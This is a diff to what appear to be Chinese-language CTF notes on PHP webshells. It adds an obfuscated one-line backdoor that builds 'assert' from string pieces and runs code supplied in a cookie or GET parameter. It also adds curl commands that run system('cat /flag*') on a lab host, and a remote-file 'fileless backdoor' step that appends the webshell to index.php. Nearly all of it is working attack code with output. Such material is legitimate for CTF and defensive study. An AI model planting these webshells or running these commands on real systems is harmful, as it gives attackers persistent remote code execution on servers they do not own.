@@ -48,7 +48,15 @@ http://172.16.2.234:8011/3.php?1=print_r(file_get_contents(%22/flag.txt%22))
 curl "http://172.16.2.234:8011/4.php" -d "1=system('cat /flag*')"
 de9d4919ce86aeb38a5332c7d1c4d24a
 ```
-####
+#### 稍微变异的一句话木马：
+```
+<?php $a="a"."s"."se"."rt";$a($_COOKIE[1]);?>
+```
+使用了变量函数 $a，变量储存了函数名，便可以直接用变量替代函数名。
+```
+curl "http://172.16.2.234:8011/5.php" --cookie "1=system('cat /flag*')"
+d869ad3131f3b77b5151ea5f75e21f97
+```
 
 ### PHP无文件后门：
 
@@ -78,7 +86,13 @@ while($code = file_get_contents($remote_file)){
 **`http://182.168.2.2/file.txt`**
 
 ```
-file_put_contents('index.php','hello world '.time(),FILE_APPEND);
-//FILE_APPEND追加写入
+file_put_contents('index.php','<?php $a="a"."s"."se"."rt";$a($_GET[1]);?>',FILE_APPEND);
+//FILE_APPEND追加写入, 单引号括起来，$无需转义
 ```
+
+**`curl "http://172.16.2.234:8011" --cookie "1=system('echo 6666666 & cat /flag*')"`**
+
+
+
+
 
